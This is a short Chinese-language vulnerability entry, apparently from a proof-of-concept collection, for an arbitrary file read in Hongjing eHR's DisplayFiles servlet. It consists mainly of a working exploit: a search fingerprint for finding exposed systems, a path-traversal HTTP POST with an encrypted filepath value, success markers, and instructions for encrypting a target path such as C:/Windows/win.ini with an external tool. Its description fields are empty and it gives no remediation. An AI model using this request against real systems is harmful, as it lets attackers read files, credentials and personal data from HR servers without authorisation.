﻿# 宏景eHR DisplayFiles 任意文件读取

> 更新时间：2024-02-27

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="HJSOFT-HCM"

> 验证脚本：HTTP

```
POST /templates/attestation/../../servlet/DisplayFiles HTTP/1.1
Content-Type: application/x-www-form-urlencoded
 
filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：宏景eHR DisplayFiles 任意文件读取.poc

```
备注：使用hrms加密工具对路径”C:/Windows/win.ini”进行加密，hrms加密工具：https://github.com/vaycore/HrmsTool，用法：HrmsTool-main> java -jar HrmsTool.jar -e C:/Windows/win.ini
```

